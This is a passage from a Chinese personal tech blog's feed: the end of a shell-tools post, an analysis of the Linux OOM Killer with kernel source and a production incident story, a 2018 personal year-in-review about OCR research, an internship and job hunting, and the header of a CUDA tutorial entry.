-c, -i, -r, -n,-A,-B,-C</li><li>sed: 用于替换，重度使用这个：<code>sed &#39;s/替换前的值/替换后的值/g&#39;</code></li><li>sort: 排序，掌握-f,-r,-n,-k(按自己需要选择哪一列的key进行排序，很有用,如-k2就是使用第2列进行排序)</li><li>uniq: 去重，一般都是结合sort使用，先sort再uniq -c</li><li>wc: 统计行数, wc -l即可</li></ul>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
      <tag>Shell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>OOM Killer机制分析</title>
    <link href="/2020/11/21/OOM-Killer%E6%9C%BA%E5%88%B6%E5%88%86%E6%9E%90/"/>
    <url>/2020/11/21/OOM-Killer%E6%9C%BA%E5%88%B6%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>近日上班工作群有人说，隔壁游戏组突然一连挂了好几台服务器，很突然暂时没分析出宕机的原因。确实很诡异，因为服务器接连挂掉的情况并不常见。我们组一下子也紧张起来，因为我们两个组用的是同一个游戏服务器引擎，隔壁出事了，也预示着我们也有类似的风险。不过没多久，隔壁组宕机的原因定位到了，有位开发在执行扫档脚本时，因为脚本grep的筛选条件没写好，这个脚本进程吃掉了系统几十G内存，触发了Linux操作系统的<strong>OOM Killer机制</strong>，把游戏进程给杀死了。因为这位开发执行的是全服扫档（几百个服务器同时执行脚本），因此接连有服务器宕机。好在发现的早，不然某知名游戏全服宕机的新闻将刷爆游戏论坛。</p><p>情景还原：我需要去游戏服去扫档（也就是扫log）获得一些游戏数据，我写了一个脚本打算把符合条件的数据重定向到一个新文件，但是太大意，脚本没写好，条件没写好，写成了类似的：<code>grep * log/*</code>，然而我们log里的文件有几百G，这样会导致会把所有log读入内存，因此迅速吃掉系统的大量内存，然后游戏进程就挂了。</p><p>听起来还是觉得很不可思议：我去扫log居然把线上业务搞挂了，真是倒霉透了。其实有更倒霉的，我们组有组员曾经因为用vim打开一个超大的文件，也把内存大量吃掉，同样导致了游戏宕机。后来运维做了一些措施限制vim打开一些超大文件（文件太大就不让打开了），防止这类似情况的发生。显然隔壁组没在这块吃过亏，因此造成本次事故。</p><p>这是一个真实生产下Linux OOM Killer机制对线上业务造成恶劣影响的典型例子，因此这里想深入讨论一下OOM Killer机制。这个线上事故，即使听到了最终原因分析，但心中仍然有很多疑问：<strong>短时间内快速吃掉大量内存的是脚本进程，为什么系统不去杀死脚本进程，而是杀死占用内存一直稳定的游戏进程？</strong></p><h2 id="什么是OOM-Killer"><a href="#什么是OOM-Killer" class="headerlink" title="什么是OOM Killer"></a>什么是OOM Killer</h2><p>OOM全称 Out-of-Memory，也就是操作系统的可利用的内存已经不足了，没法再分配新的内存出来给进程，导致系统没法继续工作，如果不紧急处理，最终的结果必定是系统关机，系统上的所有进程将被杀死。因此OS为了保证内核系统层面的稳定运行，就会根据一定算法规则，选出最应该优先被杀死的进程（理论上就是最占内存空间的那个进程）进行杀死，杀死之后系统就腾出了大量的内存空间，系统的生命将得以延续，继续稳定运行，而这个机制就是OOM Killer机制。</p><p>读到这里其实会对Linux的这个设计产生比较多的疑问，最大的疑问就是：为什么要杀死无辜者进程，而不处理肇事者进程？</p><p>仔细再分析应该就明白了，<strong>其实操作系统没办法去区分哪个是肇事者进程</strong>。考虑这种情况：A进程疯狂分配内存，导致系统可用的内存已用完，此时B进程需要分配内存空间，那B进程肯定分配空间失败啊，不断抛出异常，挂掉的还是无辜的B;如果是OS自己需要分配内存空间，发现alloc_page返回失败，那就严重多了，为了不影响后面的逻辑，OS会更倾向于与fast fail，选择shutdown。</p><p>翻了下linux OOM Killer的<a href="https://github.com/torvalds/linux/blob/master/mm/oom_kill.c">源码</a>，看到作者留下的这句话，还是蛮有意思的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* out_of_memory - kill the &quot;best&quot; process when we run out of memory</span><br><span class="line">* If we run out of memory, we have the choice between either</span><br><span class="line">* killing a random task (bad), letting the system crash (worse)</span><br><span class="line">* OR try to be smart about which process to kill. Note that we</span><br><span class="line">* don&#39;t have to be perfect here, we just have to be good.</span><br></pre></td></tr></table></figure><p>大概翻译一下：“当我们内存不足时，我们有两种处理方案：随机杀死一个任务，这可能会导致系统崩溃；或者尝试有策略地选出值得杀死的那个任务。我们没有必要做到最好，但我们只需尽力把这事做好”。– 潜台词：这件事我们至今都没找到一个完美算法，误杀进程我们不背锅。</p><p>继续从源码分析oom killer。进程使用__alloc_pages()分配内存时，当分配失败时，如果系统有配置OOM Killer，就会进入这个out_of_memory的逻辑。这个out_of_memory做了这几件事：选择要杀死的进程、杀死进程、回收进程内存空间。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">out_of_memory</span><span class="params">(struct oom_control *oc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> freed = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (oom_killer_disabled)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_memcg_oom(oc)) &#123;</span><br><span class="line">blocking_notifier_call_chain(&amp;oom_notify_list, <span class="number">0</span>, &amp;freed);</span><br><span class="line"><span class="keyword">if</span> (freed &gt; <span class="number">0</span>)</span><br><span class="line"><span class="comment">/* Got some memory back in the last second. */</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If current has a pending SIGKILL or is exiting, then automatically</span></span><br><span class="line"><span class="comment"> * select it.  The goal is to allow it to allocate so that it may</span></span><br><span class="line"><span class="comment"> * quickly exit and free its memory.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="comment">// task_will_free_mem函数其实是去检查一下当前有没有进程挂了，有的话就回收他的内存，回收内存后那就不需要oom killer杀进程了</span></span><br><span class="line"><span class="keyword">if</span> (task_will_free_mem(current)) &#123;</span><br><span class="line">mark_oom_victim(current);</span><br><span class="line">wake_oom_reaper(current);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The OOM killer does not compensate for IO-less reclaim.</span></span><br><span class="line"><span class="comment"> * pagefault_out_of_memory lost its gfp context so we have to</span></span><br><span class="line"><span class="comment"> * make sure exclude 0 mask - all other users should have at least</span></span><br><span class="line"><span class="comment"> * ___GFP_DIRECT_RECLAIM to get here. But mem_cgroup_oom() has to</span></span><br><span class="line"><span class="comment"> * invoke the OOM killer even if it is a GFP_NOFS allocation.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (oc-&gt;gfp_mask &amp;&amp; !(oc-&gt;gfp_mask &amp; __GFP_FS) &amp;&amp; !is_memcg_oom(oc))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Check if there were limitations on the allocation (only relevant for</span></span><br><span class="line"><span class="comment"> * NUMA and memcg) that may require different handling.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">oc-&gt;constraint = constrained_alloc(oc);</span><br><span class="line"><span class="keyword">if</span> (oc-&gt;constraint != CONSTRAINT_MEMORY_POLICY)</span><br><span class="line">oc-&gt;nodemask = <span class="literal">NULL</span>;</span><br><span class="line">check_panic_on_oom(oc);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_memcg_oom(oc) &amp;&amp; sysctl_oom_kill_allocating_task &amp;&amp;</span><br><span class="line">    current-&gt;mm &amp;&amp; !oom_unkillable_task(current) &amp;&amp;</span><br><span class="line">    oom_cpuset_eligible(current, oc) &amp;&amp;</span><br><span class="line">    current-&gt;signal-&gt;oom_score_adj != OOM_SCORE_ADJ_MIN) &#123;</span><br><span class="line">get_task_struct(current);</span><br><span class="line">oc-&gt;chosen = current;</span><br><span class="line">oom_kill_process(oc, <span class="string">&quot;Out of memory (oom_kill_allocating_task)&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">select_bad_process(oc);  <span class="comment">//选择需要杀死的进程</span></span><br><span class="line"><span class="comment">/* Found nothing?!?! */</span>  <span class="comment">// 找不到可以杀死的进程，那操作系统死锁了，这个情况下系统必然挂了</span></span><br><span class="line"><span class="keyword">if</span> (!oc-&gt;chosen) &#123;</span><br><span class="line">dump_header(oc, <span class="literal">NULL</span>);</span><br><span class="line">pr_warn(<span class="string">&quot;Out of memory and no killable processes...\n&quot;</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If we got here due to an actual allocation at the</span></span><br><span class="line"><span class="comment"> * system level, we cannot survive this and will enter</span></span><br><span class="line"><span class="comment"> * an endless loop in the allocator. Bail out now.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!is_sysrq_oom(oc) &amp;&amp; !is_memcg_oom(oc))</span><br><span class="line">panic(<span class="string">&quot;System is deadlocked on memory\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (oc-&gt;chosen &amp;&amp; oc-&gt;chosen != (<span class="keyword">void</span> *)<span class="number">-1U</span>L)</span><br><span class="line">oom_kill_process(oc, !is_memcg_oom(oc) ? <span class="string">&quot;Out of memory&quot;</span> :</span><br><span class="line"> <span class="string">&quot;Memory cgroup out of memory&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> !!oc-&gt;chosen;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>oom killer在选择进程杀死前先去检查一下当前有没有进程挂了，有的话优先回收他的内存资源，毕竟杀死一个线上运行的进程毕竟是下下策。然后才是进入到进程选择阶段，oom_kill.c这样实现了选择策略：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">oom_badness</span><span class="params">(struct task_struct *p, <span class="keyword">unsigned</span> <span class="keyword">long</span> totalpages)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">long</span> points;</span><br><span class="line"><span class="keyword">long</span> adj;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (oom_unkillable_task(p))</span><br><span class="line"><span class="keyword">return</span> LONG_MIN;</span><br><span class="line"></span><br><span class="line">p = find_lock_task_mm(p);</span><br><span class="line"><span class="keyword">if</span> (!p)</span><br><span class="line"><span class="keyword">return</span> LONG_MIN;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Do not even consider tasks which are explicitly marked oom</span></span><br><span class="line"><span class="comment"> * unkillable or have been already oom reaped or the are in</span></span><br><span class="line"><span class="comment"> * the middle of vfork</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">adj = (<span class="keyword">long</span>)p-&gt;signal-&gt;oom_score_adj;</span><br><span class="line"><span class="keyword">if</span> (adj == OOM_SCORE_ADJ_MIN ||</span><br><span class="line">test_bit(MMF_OOM_SKIP, &amp;p-&gt;mm-&gt;flags) ||</span><br><span class="line">in_vfork(p)) &#123;</span><br><span class="line">task_unlock(p);</span><br><span class="line"><span class="keyword">return</span> LONG_MIN;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The baseline for the badness score is the proportion of RAM that each</span></span><br><span class="line"><span class="comment"> * task&#x27;s rss, pagetable and swap space use.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">points = get_mm_rss(p-&gt;mm) + get_mm_counter(p-&gt;mm, MM_SWAPENTS) +</span><br><span class="line">mm_pgtables_bytes(p-&gt;mm) / PAGE_SIZE;</span><br><span class="line">task_unlock(p);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Normalize to oom_score_adj units */</span></span><br><span class="line">adj *= totalpages / <span class="number">1000</span>;</span><br><span class="line">points += adj;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> points;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Oom killer通过这个oom_badness函数进行打分，返回值是根据一定策略给进程打的分数，后续oom killer根据该分数高低选择出最该杀死的那个进程（分数越高越优先杀死），这里需要注意3个点：</p><ol><li><code>adj == OOM_SCORE_ADJ_MIN</code>时，说明该进程已被设置为不可被杀死进程，返回的得分将无限低（LONG_MIN）。</li><li><code>points = get_mm_rss(p-&gt;mm) + get_mm_counter(p-&gt;mm, MM_SWAPENTS) + mm_pgtables_bytes(p-&gt;mm) / PAGE_SIZE;</code>分数公式，分数是由这三部分计算打出：进程所占用的内存中的空间、SWAP所占用的空间、page cache里所占用的空间 ；</li><li><code>adj *= totalpages / 1000;  points += adj;</code> 分数另一部分的构成是这个oom_score_adj，这个是配置在内核文件的，范围是-1000~1000，默认是0，所以oom_badness先把该分数归一化，再做加法。</li></ol><p>所以，Linux提供了一个策略，可以让用户通过填写oom_score_adj文件来影响oom killer的选择，<strong>当你填-1000时，则表示该进程将不会被杀死</strong>，但如果你填写的是非-1000，那这个进程还是会参与打分，但会受到oom_score_adj的影响，比如oom_score_adj你填了-3，当你的进程消耗内存很大时，同样大概率会被杀死。还有一个值得注意的是，<strong>oom killer选择策略，只受进程占用内存和oom_score_adj的影响，至于该进程是否是短时间内快速吃掉大量内存，oom killer并不关心</strong>。这就很好解释了，为什么我们游戏进程（占用内存最多但稳定）会被优先杀死了。oom_score_adj的值可以在/proc/<pid>/oom_score_adj上修改。</pid></p><p>读到这里也大概明白oom killer的设计思路了，系统也希望有一个策略能完美地选出该杀的进程，但现实上却没有这么优秀的算法，跑在OS上的进程成千上万，我们怎么能这么有把握选出的进程必然是正确的，只是选出一个比较合适的而已，误杀在所难免。举个现实的例子，你在你的macbook上开着QQ音乐听歌，同时也开着matlab做实验，QQ音乐占用内存不多，matlab占用内存大，此时我们在matlab运行某个算法导致吃掉大量内存触发OOM Killer，那问题来了，此时你是OS，你会选择杀死matlab还是QQ音乐？从OS的角度，MATLAB是短时间内快速吃掉大量内存而且是当前内存占用最多的进程，理应杀他；用户角度，MATLAB还跑着实验啊，实验数据还没保存，你杀QQ音乐啊，那个进程对我没什么用。所以，一个优秀的策略还真不能覆盖全部场景。</p><p>生产环境上也如此，脚本进程和游戏进程，同样是占用大量内存的进程，在没额外的判断条件下，杀死任何之一都是符合要求，更何况此时游戏进程占用了更多的内存，即使是短时间内快速消耗内存的脚本进程，在OS看来，也许真没必要杀死，在OS的角度，杀死后快速腾出大量空间进程，才是那个最值得杀的进程。</p><h2 id="怎么避免OOM-Killer误杀我的业务进程？"><a href="#怎么避免OOM-Killer误杀我的业务进程？" class="headerlink" title="怎么避免OOM Killer误杀我的业务进程？"></a>怎么避免OOM Killer误杀我的业务进程？</h2><h6 id="避免oom-killer的方案"><a href="#避免oom-killer的方案" class="headerlink" title="避免oom killer的方案"></a>避免oom killer的方案</h6><ul><li><p>直接修改/proc/<pid>/oom_score_adj文件，将其置为-1000</pid></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">以前是通过&#x2F;proc&#x2F;&lt;pid&gt;&#x2F;oom_score来控制的，但近年来新版linux已经使用oom_score_adj来代替旧版的oom_score，</span><br><span class="line"></span><br><span class="line">参考：https:&#x2F;&#x2F;github.com&#x2F;tinganho&#x2F;linux-kernel&#x2F;blob&#x2F;master&#x2F;Documentation&#x2F;feature-removal-schedule.txt#L171</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>直接关闭oom-killer </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># echo &quot;0&quot; &gt; &#x2F;proc&#x2F;sys&#x2F;vm&#x2F;oom-kill 关闭</span><br><span class="line"># echo &quot;1″ &gt; &#x2F;proc&#x2F;sys&#x2F;vm&#x2F;oom-kill  激活</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>我的2018：OCR、实习和秋招</title>
    <link href="/2018/12/31/%E6%88%91%E7%9A%842018%EF%BC%9AOCR%E3%80%81%E5%AE%9E%E4%B9%A0%E5%92%8C%E7%A7%8B%E6%8B%9B/"/>
    <url>/2018/12/31/%E6%88%91%E7%9A%842018%EF%BC%9AOCR%E3%80%81%E5%AE%9E%E4%B9%A0%E5%92%8C%E7%A7%8B%E6%8B%9B/</url>
    
    <content type="html"><![CDATA[<p>真的是光阴似箭，好像昨天还沉浸在考研成功的喜悦，今天却要即将步入2019年，即将硕士毕业。老规矩，还是在每一年的最后一天总结今年以及展望明年。回首2018，经历的东西特别多，视野也开阔了不少，可以说，2018是丰收的一年。如果用三个关键词来描述我的2018，那无疑是：OCR、实习和秋招。</p><p>2018是研究生成长极快的一年，年初把研一上学期一直专注的研究整理成两个发明专利并成功公开，算是很早就达到了学院的毕业要求，所以在接下来的研究生生涯里可以花更多的时间放在自己感兴趣的领域深入探索，以及可以有充足的时间尝试新的想法。在研究生初期一直在专研传统计算机视觉的东西，无论是图像拼接还是图像特征点，都是偏向于传统方法。研究生中期逐渐转向了深度学习，尤其一直专注于OCR领域，并在这个领域探索了不少时间，从文本检测到文字识别，再到端到端的文本识别，再到近期研究的特定领域的文字识别。OCR构成了我2018研究生生涯的关键词，基本的精力都放在这里了，这期间也在博客园写了不少关于OCR的文章，貌似反响也不错。现在比较大的想法是，OCR近年来的进展非常迅猛，是在一些特定场景落地的好时期，刚好自己也在文字识别这个方向有所积累，所以也想把OCR技术应用到一些生活场景中，解决生活中的一些难题。12月也是我毕业论文开题的时间点，我也毫不犹豫地选择了OCR算法研究作为我的毕业论文方向，我觉得，我的研究生生涯如果以OCR算法研究来作为我的研究生标签的话那真是十分贴切了。</p><p>2018年是忙碌的一年，因为专硕时间非常紧，基本需要一年内完成研究成果的发布、实习和秋招找工作，另一年一般用于基本的上课修学分以及毕业论文和答辩。所以2018年就是一个忙碌的年份，因为这一年我除了要尽早给出研究成果外，还需要完成实习和秋招两件大事。今年实习招聘很早，我大概二月底就开始找暑假实习了，因为一开始没什么经验，面试什么的基本都翻车，后面掌握套路了，面试起来越来有信心，基础知识也越面越牢固，接下来接陆续收到一些offer，后面刚好也收获了Intel中国研究中心的实习offer，跟经理讨论了实习的内容，感觉非常有趣，后面就直接接受了。</p><p>后面5月到9月一直在北京英特尔实习，实习期间过得非常愉快，与一群厉害的研究员和工程师工作，真是受益匪浅。因为实习期间也刚好是秋招提前批开始的时间点，所以我也在7月底开始着手准备秋招提前批的知识储备。一边实习一边找工作真是压力很大，还有的时候实验室导师也找我做点研究，所以那段时真的是黑暗岁月，真的非常累。想起8月份那段时间经常实习时写写代码被打电话过来面试，然后匆匆忙忙去电梯间接电话面试，还是相当窘迫，不过没办法，大家都是这么过来的哈哈。秋招找工作相对于春招找实习真的是简单太多了，第一是因为有了春招实习面试的经验，秋招面试完全不虚，有套路可循，而且8月时自己的知识储备更加充分了，自信满满；第二是有了Intel的实习经历，在跟面试官介绍时也有了十足的话题。所以我在在8月各大公司的提前批招聘时基本都收获了不少不错offer，后面正式秋招都基本没参与了，所以所谓的金九银十我也没太多想法。</p><p>在这个秋招阶段一共收获了8个offer：在8月提前批大潮时已经收获了腾讯、快手、360、VIVO和平安的offer，9月结束Intel的实习回到学校继续学业，然后整个月基本处于划水阶段，然后只收获了AI独角兽地平线的算法岗offer（这种小而精的公司面试真难，五轮狂轰乱炸）。10月某个早上我在Intel的经理打电话给我高兴地通知我他为我申请到了return offer，真是振奋人心的消息！10月底，刚好看到宝洁IT管培生的招聘，这里想说说这段有趣的经历。本来是不考虑非互联网企业，后面因为有个朋友一直很想去宝洁当管培生，而且我了解宝洁这家公司后，也被这家公司圈粉了，福利和管培生培养制度都属于业界翘楚。后面我也觉得要不试试世界500强的管培生，锻炼锻炼技术之外的技能？我的英语口语很渣，但我竟敢紧张练习英语口语几天，就去宝洁广州总部面试了。这种世界顶级传统企业在招聘上并不会太关注你的技术有多强，更多关注的是你的领导能力和综合素质，考察的方面非常多，第一轮直属经理对你面试，对英语口语对你项目领导能力进行考察，看重你解决问题能力；第二轮是宝洁三个不同部门的总监对你轮番发问，全程高压问答一小时，专业技术知识考察和项目解决能力的考察依然是重点，当然英语问答还是少不了的，英语问答还是用我的蹩脚广东英语回答了一下，场面一度非常尴尬。但是后面还是收获了宝洁的IT管培生offer，也算是对我的一个综合能力的一个肯定吧！</p><p>回想2018，真的经历了很多事情，忙碌却非常充实，感觉一年时间很短，但成长又很多。3月跟随自动驾驶团队到了常熟进行了15天的上线前的研发调试，通宵达旦最后把自动驾驶最新版本成功上线，新闻发布会演示非常顺利；4月找实习，经历各种失败各种心态崩溃又不断自我调节，最后选择入职英特尔；5至9月在北京开启实习生生活，在公司里遇到一群非常优秀的同事，见到规范化的项目开发流程，学习到了书本学不到的各种技术；在生活里也认识一群好玩优秀的小伙伴，让我在北京的生活丰富多彩；8到10月秋招旅程，虽然刚开始很苦，但一路都比较顺利，最后也得到了理想公司的赏识；11到12月开始帮助导师负责新的项目，又是一个新的挑战，同时毕业论文正式开题，硕士毕业答辩似乎在向我招手了。</p><p>特意找来上一年写的2017总结里面定的2018计划，看看实现了多少：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">2018的展望：</span><br><span class="line">1.找个好工作，发个好paper，就是2018最大的愿望。   &#x2F;&#x2F; 工作找好了，paper放在2019发，2018发了专利，获得了毕业条件</span><br><span class="line">2.博客坚持写，不断总结不断提高。  &#x2F;&#x2F; 这个还在坚持</span><br><span class="line">3.在github上认真搞一个好project，拿些星星。 &#x2F;&#x2F; 大突破，贡献了几个好项目</span><br><span class="line">4.把现在的项目做好，顺利上线。 &#x2F;&#x2F; 基本完成吧</span><br><span class="line">5.坚持读经典课外书，坚持体育锻炼，综合素质比什么都重要。  &#x2F;&#x2F;看书和锻炼都有在坚持</span><br><span class="line">6.好好搞个大比赛，上次没拿到奖，这次争取拿到！ &#x2F;&#x2F;2018没有参加比赛了，感觉比赛对我的吸引力不是太强，太忙了</span><br></pre></td></tr></table></figure><p>说一说2018最富有成就感的事情吧</p><ol><li>去了Intel实习</li><li>在北京结识到一群优秀有趣的朋友</li><li>找到了理想的工作</li><li>博客一直坚持更新，虽然更新频率不高，但是还是会坚持的，现在技术博客的粉丝突破了800，阅读量也超过50W了</li><li>今年在GitHub开源了几个好玩的项目，逐渐有了一百多个follwers，星星也攒了好几百</li><li>收获两项发明专利</li></ol><p>2018总结完了，是时候给新的一年做做计划了！</p><ol><li>整理手头上的研究成果，投顶会paper</li><li>顺利过论文审核，顺利过论文答辩，顺利7月毕业！！！2019的终极目标。</li><li>钻研一下分布式系统，分布式计算，推荐系统的知识</li><li>会在毕业论文写好以后开源两个有趣的项目：多图自动拼接算法和票据识别系统</li><li>走南闯北，能顺利毕业的话，真想去台湾走一走！</li></ol><p>上传几张2018有趣的照片</p><p>我在Github上2018一年的活动，我是一个纯粹的程序员：</p><p><img src="/2018/12/31/%E6%88%91%E7%9A%842018%EF%BC%9AOCR%E3%80%81%E5%AE%9E%E4%B9%A0%E5%92%8C%E7%A7%8B%E6%8B%9B/1093303-20181231172436932-296509297.png"></p><p>我参加了阿里极客训练营，见到了大佬云风<br><img src="/2018/12/31/%E6%88%91%E7%9A%842018%EF%BC%9AOCR%E3%80%81%E5%AE%9E%E4%B9%A0%E5%92%8C%E7%A7%8B%E6%8B%9B/1093303-20181231172718496-2042830847.jpg"></p><p>常熟拼命上线后，去了苏州逛了逛，夜色迷人<br><img src="/2018/12/31/%E6%88%91%E7%9A%842018%EF%BC%9AOCR%E3%80%81%E5%AE%9E%E4%B9%A0%E5%92%8C%E7%A7%8B%E6%8B%9B/1093303-20181231173210049-453800975.jpg"></p><p>某天实习下班，发现天都黑了，远远望去公司大楼，非常漂亮：</p><p><img src="/2018/12/31/%E6%88%91%E7%9A%842018%EF%BC%9AOCR%E3%80%81%E5%AE%9E%E4%B9%A0%E5%92%8C%E7%A7%8B%E6%8B%9B/1093303-20181231173229767-1681827300.jpg"></p><p>北京实习时的小窝，逸成东苑，难忘的地方：</p><p><img src="/2018/12/31/%E6%88%91%E7%9A%842018%EF%BC%9AOCR%E3%80%81%E5%AE%9E%E4%B9%A0%E5%92%8C%E7%A7%8B%E6%8B%9B/1093303-20181231173255033-386868454.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>生活</category>
      
    </categories>
    
    
    <tags>
      
      <tag>成长</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CUDA编程之快速入门</title>
    <link href="/2018/09/19/CUDA%E7%BC%96%E7%A8%8B%E4%B9%8B%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/"/>
    <url>/2018/09/19/CUDA%E7%BC%96%E7%A8%8B%E4%B9%8B%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/</url>
    
